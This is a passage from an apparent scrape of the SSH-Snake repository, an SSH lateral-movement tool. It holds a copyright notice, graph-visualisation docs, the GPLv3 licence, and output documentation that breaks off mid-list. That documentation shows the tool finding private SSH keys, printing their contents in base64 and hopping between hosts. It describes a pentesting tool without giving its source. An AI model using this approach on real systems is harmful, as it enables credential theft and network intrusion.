{
  "metadata": {
    "timestamp": 1736568422785,
    "page": 376,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjM3OQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "MegaManSec/SSH-Snake",
      "stars": 2005,
      "defaultBranch": "main",
      "files": [
        {
          "name": "COPYING",
          "type": "blob",
          "size": 0.701171875,
          "content": "SSH-Snake: Automated SSH-Based Network Traversal\n\nCopyright (C) 2024 Joshua Rogers <https://joshua.hu/>\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program.  If not, see <https://www.gnu.org/licenses/>.\n"
        },
        {
          "name": "GRAPHICS.md",
          "type": "blob",
          "size": 2.8447265625,
          "content": "# Visualizing System Relationships\n\n\nSSH-Snake's output can be used to create visualizations of the network it has traversed. For example, using the python script _generate-graph.py_ provided in [tools/](tools/), we can generate a PNG visualizing the network:\n\n![A graph visualizing the relation between systems using SSH](tools/SSH-Snake-dot-circo.png)\nIn [this image](tools/SSH-Snake-dot-circo.png), the blue nodes indicate a destination that can connect to itself (meaning a key on the system is also trusted by `authorized_keys`). The red edges/lines indicate that the connection from one system to another is bi-directional, meaning system A can SSH to system B and system B can SSH to system A. Note that this image includes usernames in the system labels.\n\nThis graph was created using the command:\n\n```bash\npython3 tools/generate-graph.py --with-users --file SSHSnake.log --format dot\ncirco -Tpng -Goverlap=false -Gsplines=true -Gconcentrate=true -Gnodesep=0.1 -Goverlap=false SSHSnake_dot_file.dot -o SSH-Snake-dot-circo.png\n```\n\nwhich first generates a [dot file](https://en.wikipedia.org/wiki/DOT_(graph_description_language), then uses [graphviz' circo](https://graphviz.org/docs/layouts/circo/) to generate a PNG.\n\n---\n\nAn alternative visualization can be created in [gexf format](https://gexf.net/), and then [Gephi](https://gephi.org/users/download/) can be used to create another meaningful image:\n\n![A graph visualizing the relation between systems using SSH](tools/SSH-Snake-Gephi.svg)\n\nIn [this image](tools/SSH-Snake-Gephi.svg), the green nodes indicate a _host_ (without a username) that can connect to itself, and green lines/edges indicate that the connection is bi-directional. The gray host in the top right corner is the host that the script was initially executed on. Note that the hosts do __not__ include the usernames of the system, and this visualization indicates system to system connections, rather than destination (`user@host`) to destination (`user@host`) connections.\n\nThis graph was created using the command (note the lack of `--with-users`):\n\n```bash\npython3 tools/generate-graph.py --file SSHSnake.log --format gexf\n```\n\nUsing Gephi, the final image was generated.\n\n---\n\nCytoscape is another tool that can be used to generate interesting graphs. Using the same gexf format output file from before, you can install the gexf-app app for Cytoscape and import the file.\n\n|![A graph visualizing the relation between systems using SSH](tools/SSH-Snake-CytoScape.svg)The blue nodes indicate the _destination_ can connect to itself (user@host<-->user@host). The red edges indicate that the connection is bi-directional (user1@host1<-->user2@host2).|\n\nNot only can you create an image like this in Cytoscape (using the \"yFiles hierarchical Layout\"), you can also create webpages like this one: [https://megamansec.github.io/SSH-Snake/](https://megamansec.github.io/SSH-Snake/#/).\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 34.3251953125,
          "content": "                    GNU GENERAL PUBLIC LICENSE\n                       Version 3, 29 June 2007\n\n Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>\n Everyone is permitted to copy and distribute verbatim copies\n of this license document, but changing it is not allowed.\n\n                            Preamble\n\n  The GNU General Public License is a free, copyleft license for\nsoftware and other kinds of works.\n\n  The licenses for most software and other practical works are designed\nto take away your freedom to share and change the works.  By contrast,\nthe GNU General Public License is intended to guarantee your freedom to\nshare and change all versions of a program--to make sure it remains free\nsoftware for all its users.  We, the Free Software Foundation, use the\nGNU General Public License for most of our software; it applies also to\nany other work released this way by its authors.  You can apply it to\nyour programs, too.\n\n  When we speak of free software, we are referring to freedom, not\nprice.  Our General Public Licenses are designed to make sure that you\nhave the freedom to distribute copies of free software (and charge for\nthem if you wish), that you receive source code or can get it if you\nwant it, that you can change the software or use pieces of it in new\nfree programs, and that you know you can do these things.\n\n  To protect your rights, we need to prevent others from denying you\nthese rights or asking you to surrender the rights.  Therefore, you have\ncertain responsibilities if you distribute copies of the software, or if\nyou modify it: responsibilities to respect the freedom of others.\n\n  For example, if you distribute copies of such a program, whether\ngratis or for a fee, you must pass on to the recipients the same\nfreedoms that you received.  You must make sure that they, too, receive\nor can get the source code.  And you must show them these terms so they\nknow their rights.\n\n  Developers that use the GNU GPL protect your rights with two steps:\n(1) assert copyright on the software, and (2) offer you this License\ngiving you legal permission to copy, distribute and/or modify it.\n\n  For the developers' and authors' protection, the GPL clearly explains\nthat there is no warranty for this free software.  For both users' and\nauthors' sake, the GPL requires that modified versions be marked as\nchanged, so that their problems will not be attributed erroneously to\nauthors of previous versions.\n\n  Some devices are designed to deny users access to install or run\nmodified versions of the software inside them, although the manufacturer\ncan do so.  This is fundamentally incompatible with the aim of\nprotecting users' freedom to change the software.  The systematic\npattern of such abuse occurs in the area of products for individuals to\nuse, which is precisely where it is most unacceptable.  Therefore, we\nhave designed this version of the GPL to prohibit the practice for those\nproducts.  If such problems arise substantially in other domains, we\nstand ready to extend this provision to those domains in future versions\nof the GPL, as needed to protect the freedom of users.\n\n  Finally, every program is threatened constantly by software patents.\nStates should not allow patents to restrict development and use of\nsoftware on general-purpose computers, but in those that do, we wish to\navoid the special danger that patents applied to a free program could\nmake it effectively proprietary.  To prevent this, the GPL assures that\npatents cannot be used to render the program non-free.\n\n  The precise terms and conditions for copying, distribution and\nmodification follow.\n\n                       TERMS AND CONDITIONS\n\n  0. Definitions.\n\n  \"This License\" refers to version 3 of the GNU General Public License.\n\n  \"Copyright\" also means copyright-like laws that apply to other kinds of\nworks, such as semiconductor masks.\n\n  \"The Program\" refers to any copyrightable work licensed under this\nLicense.  Each licensee is addressed as \"you\".  \"Licensees\" and\n\"recipients\" may be individuals or organizations.\n\n  To \"modify\" a work means to copy from or adapt all or part of the work\nin a fashion requiring copyright permission, other than the making of an\nexact copy.  The resulting work is called a \"modified version\" of the\nearlier work or a work \"based on\" the earlier work.\n\n  A \"covered work\" means either the unmodified Program or a work based\non the Program.\n\n  To \"propagate\" a work means to do anything with it that, without\npermission, would make you directly or secondarily liable for\ninfringement under applicable copyright law, except executing it on a\ncomputer or modifying a private copy.  Propagation includes copying,\ndistribution (with or without modification), making available to the\npublic, and in some countries other activities as well.\n\n  To \"convey\" a work means any kind of propagation that enables other\nparties to make or receive copies.  Mere interaction with a user through\na computer network, with no transfer of a copy, is not conveying.\n\n  An interactive user interface displays \"Appropriate Legal Notices\"\nto the extent that it includes a convenient and prominently visible\nfeature that (1) displays an appropriate copyright notice, and (2)\ntells the user that there is no warranty for the work (except to the\nextent that warranties are provided), that licensees may convey the\nwork under this License, and how to view a copy of this License.  If\nthe interface presents a list of user commands or options, such as a\nmenu, a prominent item in the list meets this criterion.\n\n  1. Source Code.\n\n  The \"source code\" for a work means the preferred form of the work\nfor making modifications to it.  \"Object code\" means any non-source\nform of a work.\n\n  A \"Standard Interface\" means an interface that either is an official\nstandard defined by a recognized standards body, or, in the case of\ninterfaces specified for a particular programming language, one that\nis widely used among developers working in that language.\n\n  The \"System Libraries\" of an executable work include anything, other\nthan the work as a whole, that (a) is included in the normal form of\npackaging a Major Component, but which is not part of that Major\nComponent, and (b) serves only to enable use of the work with that\nMajor Component, or to implement a Standard Interface for which an\nimplementation is available to the public in source code form.  A\n\"Major Component\", in this context, means a major essential component\n(kernel, window system, and so on) of the specific operating system\n(if any) on which the executable work runs, or a compiler used to\nproduce the work, or an object code interpreter used to run it.\n\n  The \"Corresponding Source\" for a work in object code form means all\nthe source code needed to generate, install, and (for an executable\nwork) run the object code and to modify the work, including scripts to\ncontrol those activities.  However, it does not include the work's\nSystem Libraries, or general-purpose tools or generally available free\nprograms which are used unmodified in performing those activities but\nwhich are not part of the work.  For example, Corresponding Source\nincludes interface definition files associated with source files for\nthe work, and the source code for shared libraries and dynamically\nlinked subprograms that the work is specifically designed to require,\nsuch as by intimate data communication or control flow between those\nsubprograms and other parts of the work.\n\n  The Corresponding Source need not include anything that users\ncan regenerate automatically from other parts of the Corresponding\nSource.\n\n  The Corresponding Source for a work in source code form is that\nsame work.\n\n  2. Basic Permissions.\n\n  All rights granted under this License are granted for the term of\ncopyright on the Program, and are irrevocable provided the stated\nconditions are met.  This License explicitly affirms your unlimited\npermission to run the unmodified Program.  The output from running a\ncovered work is covered by this License only if the output, given its\ncontent, constitutes a covered work.  This License acknowledges your\nrights of fair use or other equivalent, as provided by copyright law.\n\n  You may make, run and propagate covered works that you do not\nconvey, without conditions so long as your license otherwise remains\nin force.  You may convey covered works to others for the sole purpose\nof having them make modifications exclusively for you, or provide you\nwith facilities for running those works, provided that you comply with\nthe terms of this License in conveying all material for which you do\nnot control copyright.  Those thus making or running the covered works\nfor you must do so exclusively on your behalf, under your direction\nand control, on terms that prohibit them from making any copies of\nyour copyrighted material outside their relationship with you.\n\n  Conveying under any other circumstances is permitted solely under\nthe conditions stated below.  Sublicensing is not allowed; section 10\nmakes it unnecessary.\n\n  3. Protecting Users' Legal Rights From Anti-Circumvention Law.\n\n  No covered work shall be deemed part of an effective technological\nmeasure under any applicable law fulfilling obligations under article\n11 of the WIPO copyright treaty adopted on 20 December 1996, or\nsimilar laws prohibiting or restricting circumvention of such\nmeasures.\n\n  When you convey a covered work, you waive any legal power to forbid\ncircumvention of technological measures to the extent such circumvention\nis effected by exercising rights under this License with respect to\nthe covered work, and you disclaim any intention to limit operation or\nmodification of the work as a means of enforcing, against the work's\nusers, your or third parties' legal rights to forbid circumvention of\ntechnological measures.\n\n  4. Conveying Verbatim Copies.\n\n  You may convey verbatim copies of the Program's source code as you\nreceive it, in any medium, provided that you conspicuously and\nappropriately publish on each copy an appropriate copyright notice;\nkeep intact all notices stating that this License and any\nnon-permissive terms added in accord with section 7 apply to the code;\nkeep intact all notices of the absence of any warranty; and give all\nrecipients a copy of this License along with the Program.\n\n  You may charge any price or no price for each copy that you convey,\nand you may offer support or warranty protection for a fee.\n\n  5. Conveying Modified Source Versions.\n\n  You may convey a work based on the Program, or the modifications to\nproduce it from the Program, in the form of source code under the\nterms of section 4, provided that you also meet all of these conditions:\n\n    a) The work must carry prominent notices stating that you modified\n    it, and giving a relevant date.\n\n    b) The work must carry prominent notices stating that it is\n    released under this License and any conditions added under section\n    7.  This requirement modifies the requirement in section 4 to\n    \"keep intact all notices\".\n\n    c) You must license the entire work, as a whole, under this\n    License to anyone who comes into possession of a copy.  This\n    License will therefore apply, along with any applicable section 7\n    additional terms, to the whole of the work, and all its parts,\n    regardless of how they are packaged.  This License gives no\n    permission to license the work in any other way, but it does not\n    invalidate such permission if you have separately received it.\n\n    d) If the work has interactive user interfaces, each must display\n    Appropriate Legal Notices; however, if the Program has interactive\n    interfaces that do not display Appropriate Legal Notices, your\n    work need not make them do so.\n\n  A compilation of a covered work with other separate and independent\nworks, which are not by their nature extensions of the covered work,\nand which are not combined with it such as to form a larger program,\nin or on a volume of a storage or distribution medium, is called an\n\"aggregate\" if the compilation and its resulting copyright are not\nused to limit the access or legal rights of the compilation's users\nbeyond what the individual works permit.  Inclusion of a covered work\nin an aggregate does not cause this License to apply to the other\nparts of the aggregate.\n\n  6. Conveying Non-Source Forms.\n\n  You may convey a covered work in object code form under the terms\nof sections 4 and 5, provided that you also convey the\nmachine-readable Corresponding Source under the terms of this License,\nin one of these ways:\n\n    a) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by the\n    Corresponding Source fixed on a durable physical medium\n    customarily used for software interchange.\n\n    b) Convey the object code in, or embodied in, a physical product\n    (including a physical distribution medium), accompanied by a\n    written offer, valid for at least three years and valid for as\n    long as you offer spare parts or customer support for that product\n    model, to give anyone who possesses the object code either (1) a\n    copy of the Corresponding Source for all the software in the\n    product that is covered by this License, on a durable physical\n    medium customarily used for software interchange, for a price no\n    more than your reasonable cost of physically performing this\n    conveying of source, or (2) access to copy the\n    Corresponding Source from a network server at no charge.\n\n    c) Convey individual copies of the object code with a copy of the\n    written offer to provide the Corresponding Source.  This\n    alternative is allowed only occasionally and noncommercially, and\n    only if you received the object code with such an offer, in accord\n    with subsection 6b.\n\n    d) Convey the object code by offering access from a designated\n    place (gratis or for a charge), and offer equivalent access to the\n    Corresponding Source in the same way through the same place at no\n    further charge.  You need not require recipients to copy the\n    Corresponding Source along with the object code.  If the place to\n    copy the object code is a network server, the Corresponding Source\n    may be on a different server (operated by you or a third party)\n    that supports equivalent copying facilities, provided you maintain\n    clear directions next to the object code saying where to find the\n    Corresponding Source.  Regardless of what server hosts the\n    Corresponding Source, you remain obligated to ensure that it is\n    available for as long as needed to satisfy these requirements.\n\n    e) Convey the object code using peer-to-peer transmission, provided\n    you inform other peers where the object code and Corresponding\n    Source of the work are being offered to the general public at no\n    charge under subsection 6d.\n\n  A separable portion of the object code, whose source code is excluded\nfrom the Corresponding Source as a System Library, need not be\nincluded in conveying the object code work.\n\n  A \"User Product\" is either (1) a \"consumer product\", which means any\ntangible personal property which is normally used for personal, family,\nor household purposes, or (2) anything designed or sold for incorporation\ninto a dwelling.  In determining whether a product is a consumer product,\ndoubtful cases shall be resolved in favor of coverage.  For a particular\nproduct received by a particular user, \"normally used\" refers to a\ntypical or common use of that class of product, regardless of the status\nof the particular user or of the way in which the particular user\nactually uses, or expects or is expected to use, the product.  A product\nis a consumer product regardless of whether the product has substantial\ncommercial, industrial or non-consumer uses, unless such uses represent\nthe only significant mode of use of the product.\n\n  \"Installation Information\" for a User Product means any methods,\nprocedures, authorization keys, or other information required to install\nand execute modified versions of a covered work in that User Product from\na modified version of its Corresponding Source.  The information must\nsuffice to ensure that the continued functioning of the modified object\ncode is in no case prevented or interfered with solely because\nmodification has been made.\n\n  If you convey an object code work under this section in, or with, or\nspecifically for use in, a User Product, and the conveying occurs as\npart of a transaction in which the right of possession and use of the\nUser Product is transferred to the recipient in perpetuity or for a\nfixed term (regardless of how the transaction is characterized), the\nCorresponding Source conveyed under this section must be accompanied\nby the Installation Information.  But this requirement does not apply\nif neither you nor any third party retains the ability to install\nmodified object code on the User Product (for example, the work has\nbeen installed in ROM).\n\n  The requirement to provide Installation Information does not include a\nrequirement to continue to provide support service, warranty, or updates\nfor a work that has been modified or installed by the recipient, or for\nthe User Product in which it has been modified or installed.  Access to a\nnetwork may be denied when the modification itself materially and\nadversely affects the operation of the network or violates the rules and\nprotocols for communication across the network.\n\n  Corresponding Source conveyed, and Installation Information provided,\nin accord with this section must be in a format that is publicly\ndocumented (and with an implementation available to the public in\nsource code form), and must require no special password or key for\nunpacking, reading or copying.\n\n  7. Additional Terms.\n\n  \"Additional permissions\" are terms that supplement the terms of this\nLicense by making exceptions from one or more of its conditions.\nAdditional permissions that are applicable to the entire Program shall\nbe treated as though they were included in this License, to the extent\nthat they are valid under applicable law.  If additional permissions\napply only to part of the Program, that part may be used separately\nunder those permissions, but the entire Program remains governed by\nthis License without regard to the additional permissions.\n\n  When you convey a copy of a covered work, you may at your option\nremove any additional permissions from that copy, or from any part of\nit.  (Additional permissions may be written to require their own\nremoval in certain cases when you modify the work.)  You may place\nadditional permissions on material, added by you to a covered work,\nfor which you have or can give appropriate copyright permission.\n\n  Notwithstanding any other provision of this License, for material you\nadd to a covered work, you may (if authorized by the copyright holders of\nthat material) supplement the terms of this License with terms:\n\n    a) Disclaiming warranty or limiting liability differently from the\n    terms of sections 15 and 16 of this License; or\n\n    b) Requiring preservation of specified reasonable legal notices or\n    author attributions in that material or in the Appropriate Legal\n    Notices displayed by works containing it; or\n\n    c) Prohibiting misrepresentation of the origin of that material, or\n    requiring that modified versions of such material be marked in\n    reasonable ways as different from the original version; or\n\n    d) Limiting the use for publicity purposes of names of licensors or\n    authors of the material; or\n\n    e) Declining to grant rights under trademark law for use of some\n    trade names, trademarks, or service marks; or\n\n    f) Requiring indemnification of licensors and authors of that\n    material by anyone who conveys the material (or modified versions of\n    it) with contractual assumptions of liability to the recipient, for\n    any liability that these contractual assumptions directly impose on\n    those licensors and authors.\n\n  All other non-permissive additional terms are considered \"further\nrestrictions\" within the meaning of section 10.  If the Program as you\nreceived it, or any part of it, contains a notice stating that it is\ngoverned by this License along with a term that is a further\nrestriction, you may remove that term.  If a license document contains\na further restriction but permits relicensing or conveying under this\nLicense, you may add to a covered work material governed by the terms\nof that license document, provided that the further restriction does\nnot survive such relicensing or conveying.\n\n  If you add terms to a covered work in accord with this section, you\nmust place, in the relevant source files, a statement of the\nadditional terms that apply to those files, or a notice indicating\nwhere to find the applicable terms.\n\n  Additional terms, permissive or non-permissive, may be stated in the\nform of a separately written license, or stated as exceptions;\nthe above requirements apply either way.\n\n  8. Termination.\n\n  You may not propagate or modify a covered work except as expressly\nprovided under this License.  Any attempt otherwise to propagate or\nmodify it is void, and will automatically terminate your rights under\nthis License (including any patent licenses granted under the third\nparagraph of section 11).\n\n  However, if you cease all violation of this License, then your\nlicense from a particular copyright holder is reinstated (a)\nprovisionally, unless and until the copyright holder explicitly and\nfinally terminates your license, and (b) permanently, if the copyright\nholder fails to notify you of the violation by some reasonable means\nprior to 60 days after the cessation.\n\n  Moreover, your license from a particular copyright holder is\nreinstated permanently if the copyright holder notifies you of the\nviolation by some reasonable means, this is the first time you have\nreceived notice of violation of this License (for any work) from that\ncopyright holder, and you cure the violation prior to 30 days after\nyour receipt of the notice.\n\n  Termination of your rights under this section does not terminate the\nlicenses of parties who have received copies or rights from you under\nthis License.  If your rights have been terminated and not permanently\nreinstated, you do not qualify to receive new licenses for the same\nmaterial under section 10.\n\n  9. Acceptance Not Required for Having Copies.\n\n  You are not required to accept this License in order to receive or\nrun a copy of the Program.  Ancillary propagation of a covered work\noccurring solely as a consequence of using peer-to-peer transmission\nto receive a copy likewise does not require acceptance.  However,\nnothing other than this License grants you permission to propagate or\nmodify any covered work.  These actions infringe copyright if you do\nnot accept this License.  Therefore, by modifying or propagating a\ncovered work, you indicate your acceptance of this License to do so.\n\n  10. Automatic Licensing of Downstream Recipients.\n\n  Each time you convey a covered work, the recipient automatically\nreceives a license from the original licensors, to run, modify and\npropagate that work, subject to this License.  You are not responsible\nfor enforcing compliance by third parties with this License.\n\n  An \"entity transaction\" is a transaction transferring control of an\norganization, or substantially all assets of one, or subdividing an\norganization, or merging organizations.  If propagation of a covered\nwork results from an entity transaction, each party to that\ntransaction who receives a copy of the work also receives whatever\nlicenses to the work the party's predecessor in interest had or could\ngive under the previous paragraph, plus a right to possession of the\nCorresponding Source of the work from the predecessor in interest, if\nthe predecessor has it or can get it with reasonable efforts.\n\n  You may not impose any further restrictions on the exercise of the\nrights granted or affirmed under this License.  For example, you may\nnot impose a license fee, royalty, or other charge for exercise of\nrights granted under this License, and you may not initiate litigation\n(including a cross-claim or counterclaim in a lawsuit) alleging that\nany patent claim is infringed by making, using, selling, offering for\nsale, or importing the Program or any portion of it.\n\n  11. Patents.\n\n  A \"contributor\" is a copyright holder who authorizes use under this\nLicense of the Program or a work on which the Program is based.  The\nwork thus licensed is called the contributor's \"contributor version\".\n\n  A contributor's \"essential patent claims\" are all patent claims\nowned or controlled by the contributor, whether already acquired or\nhereafter acquired, that would be infringed by some manner, permitted\nby this License, of making, using, or selling its contributor version,\nbut do not include claims that would be infringed only as a\nconsequence of further modification of the contributor version.  For\npurposes of this definition, \"control\" includes the right to grant\npatent sublicenses in a manner consistent with the requirements of\nthis License.\n\n  Each contributor grants you a non-exclusive, worldwide, royalty-free\npatent license under the contributor's essential patent claims, to\nmake, use, sell, offer for sale, import and otherwise run, modify and\npropagate the contents of its contributor version.\n\n  In the following three paragraphs, a \"patent license\" is any express\nagreement or commitment, however denominated, not to enforce a patent\n(such as an express permission to practice a patent or covenant not to\nsue for patent infringement).  To \"grant\" such a patent license to a\nparty means to make such an agreement or commitment not to enforce a\npatent against the party.\n\n  If you convey a covered work, knowingly relying on a patent license,\nand the Corresponding Source of the work is not available for anyone\nto copy, free of charge and under the terms of this License, through a\npublicly available network server or other readily accessible means,\nthen you must either (1) cause the Corresponding Source to be so\navailable, or (2) arrange to deprive yourself of the benefit of the\npatent license for this particular work, or (3) arrange, in a manner\nconsistent with the requirements of this License, to extend the patent\nlicense to downstream recipients.  \"Knowingly relying\" means you have\nactual knowledge that, but for the patent license, your conveying the\ncovered work in a country, or your recipient's use of the covered work\nin a country, would infringe one or more identifiable patents in that\ncountry that you have reason to believe are valid.\n\n  If, pursuant to or in connection with a single transaction or\narrangement, you convey, or propagate by procuring conveyance of, a\ncovered work, and grant a patent license to some of the parties\nreceiving the covered work authorizing them to use, propagate, modify\nor convey a specific copy of the covered work, then the patent license\nyou grant is automatically extended to all recipients of the covered\nwork and works based on it.\n\n  A patent license is \"discriminatory\" if it does not include within\nthe scope of its coverage, prohibits the exercise of, or is\nconditioned on the non-exercise of one or more of the rights that are\nspecifically granted under this License.  You may not convey a covered\nwork if you are a party to an arrangement with a third party that is\nin the business of distributing software, under which you make payment\nto the third party based on the extent of your activity of conveying\nthe work, and under which the third party grants, to any of the\nparties who would receive the covered work from you, a discriminatory\npatent license (a) in connection with copies of the covered work\nconveyed by you (or copies made from those copies), or (b) primarily\nfor and in connection with specific products or compilations that\ncontain the covered work, unless you entered into that arrangement,\nor that patent license was granted, prior to 28 March 2007.\n\n  Nothing in this License shall be construed as excluding or limiting\nany implied license or other defenses to infringement that may\notherwise be available to you under applicable patent law.\n\n  12. No Surrender of Others' Freedom.\n\n  If conditions are imposed on you (whether by court order, agreement or\notherwise) that contradict the conditions of this License, they do not\nexcuse you from the conditions of this License.  If you cannot convey a\ncovered work so as to satisfy simultaneously your obligations under this\nLicense and any other pertinent obligations, then as a consequence you may\nnot convey it at all.  For example, if you agree to terms that obligate you\nto collect a royalty for further conveying from those to whom you convey\nthe Program, the only way you could satisfy both those terms and this\nLicense would be to refrain entirely from conveying the Program.\n\n  13. Use with the GNU Affero General Public License.\n\n  Notwithstanding any other provision of this License, you have\npermission to link or combine any covered work with a work licensed\nunder version 3 of the GNU Affero General Public License into a single\ncombined work, and to convey the resulting work.  The terms of this\nLicense will continue to apply to the part which is the covered work,\nbut the special requirements of the GNU Affero General Public License,\nsection 13, concerning interaction through a network will apply to the\ncombination as such.\n\n  14. Revised Versions of this License.\n\n  The Free Software Foundation may publish revised and/or new versions of\nthe GNU General Public License from time to time.  Such new versions will\nbe similar in spirit to the present version, but may differ in detail to\naddress new problems or concerns.\n\n  Each version is given a distinguishing version number.  If the\nProgram specifies that a certain numbered version of the GNU General\nPublic License \"or any later version\" applies to it, you have the\noption of following the terms and conditions either of that numbered\nversion or of any later version published by the Free Software\nFoundation.  If the Program does not specify a version number of the\nGNU General Public License, you may choose any version ever published\nby the Free Software Foundation.\n\n  If the Program specifies that a proxy can decide which future\nversions of the GNU General Public License can be used, that proxy's\npublic statement of acceptance of a version permanently authorizes you\nto choose that version for the Program.\n\n  Later license versions may give you additional or different\npermissions.  However, no additional obligations are imposed on any\nauthor or copyright holder as a result of your choosing to follow a\nlater version.\n\n  15. Disclaimer of Warranty.\n\n  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY\nAPPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT\nHOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM \"AS IS\" WITHOUT WARRANTY\nOF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,\nTHE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR\nPURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM\nIS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF\nALL NECESSARY SERVICING, REPAIR OR CORRECTION.\n\n  16. Limitation of Liability.\n\n  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING\nWILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS\nTHE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY\nGENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE\nUSE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF\nDATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD\nPARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),\nEVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF\nSUCH DAMAGES.\n\n  17. Interpretation of Sections 15 and 16.\n\n  If the disclaimer of warranty and limitation of liability provided\nabove cannot be given local legal effect according to their terms,\nreviewing courts shall apply local law that most closely approximates\nan absolute waiver of all civil liability in connection with the\nProgram, unless a warranty or assumption of liability accompanies a\ncopy of the Program in return for a fee.\n\n                     END OF TERMS AND CONDITIONS\n\n            How to Apply These Terms to Your New Programs\n\n  If you develop a new program, and you want it to be of the greatest\npossible use to the public, the best way to achieve this is to make it\nfree software which everyone can redistribute and change under these terms.\n\n  To do so, attach the following notices to the program.  It is safest\nto attach them to the start of each source file to most effectively\nstate the exclusion of warranty; and each file should have at least\nthe \"copyright\" line and a pointer to where the full notice is found.\n\n    <one line to give the program's name and a brief idea of what it does.>\n    Copyright (C) <year>  <name of author>\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <https://www.gnu.org/licenses/>.\n\nAlso add information on how to contact you by electronic and paper mail.\n\n  If the program does terminal interaction, make it output a short\nnotice like this when it starts in an interactive mode:\n\n    <program>  Copyright (C) <year>  <name of author>\n    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.\n    This is free software, and you are welcome to redistribute it\n    under certain conditions; type `show c' for details.\n\nThe hypothetical commands `show w' and `show c' should show the appropriate\nparts of the General Public License.  Of course, your program's commands\nmight be different; for a GUI interface, you would use an \"about box\".\n\n  You should also get your employer (if you work as a programmer) or school,\nif any, to sign a \"copyright disclaimer\" for the program, if necessary.\nFor more information on this, and how to apply and follow the GNU GPL, see\n<https://www.gnu.org/licenses/>.\n\n  The GNU General Public License does not permit incorporating your program\ninto proprietary programs.  If your program is a subroutine library, you\nmay consider it more useful to permit linking proprietary applications with\nthe library.  If this is what you want to do, use the GNU Lesser General\nPublic License instead of this License.  But first, please read\n<https://www.gnu.org/licenses/why-not-lgpl.html>.\n"
        },
        {
          "name": "OUTPUT.md",
          "type": "blob",
          "size": 7.705078125,
          "content": "\nSSH-Snake's approach to output is quite simple and consists of the following:\n\n- Print where we are,\n- Print any keys found,\n- Print any exceptional information.\n\nA normal output will look something like this:\n\n```\n(1) [1704020277]jrogers@10.128.0.25\n(2) [1704020277]jrogers@(10.128.0.25)\n(3) [1704020277]jrogers@10.128.0.25: Discovered usable private key in [/home/jrogers/.ssh/id_rsa]\n(4) [1704020277]jrogers@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUE[...]\n(5) [1704020278]jrogers@10.128.0.25: Discovered unusable private key in [/home/jrogers/.ssh/protected]\n(6) [1704020278]jrogers@10.128.0.25: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/protected]: LS0tLS1CRUdJTiB[...]\n(7) [1704020278]jrogers@10.128.0.25: EXTERNAL_MSG: INFO: Beginning with 12 dests and 1 keys\n(8) [1704020279] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n(9) [1704020279] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n(10) [1704020279] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n(11) [1704020279] jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n(12) [1704020277] jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27: Discovered usable private key in [/home/jrogers/.ssh/id_rsa]\n....\n```\n\nEvery line is prepended with the UNIX epoch time.\n\nGoing through each line one by one, the purpose of each line is explained respectively:\n\n1. The current destination (`user@host`) in the so-called \"hosts chain\" format. This destination address is the exact address that was used to `ssh` to (`ssh -i key user@host`).\n2. The current destination (`user@(host)`) in the so-called \"hostnames chain\" format. This format identifies a system based on all of its addresses. For example, a system with three IPv4 addresses corresponds to `user@(ip1:ip2:ip3)` where each `ip` is the IPv4 address. This format of destination is a clear indicator of the system and is used to ensure scanning of duplicate systems does not occur (such that connecting to a secondary address does not trigger a duplicate scan for a system that has already been scanned).\n3. A private key that can be used (no passphrase or permission issue) has been discovered in `/home/jrogers/.ssh/id_rsa`.\n4. The contents of the private key discovered in `/home/jrogers/.ssh/id_rsa` in base64 format.\n5. A private key that cannot be used (either a passphrase or some type of permission issue) has been discovered in `/home/jrogers/.ssh/protected`.\n6. The contents of the private key discovered in `/home/jrogers/.ssh/protected` in base64 format.\n7. 1 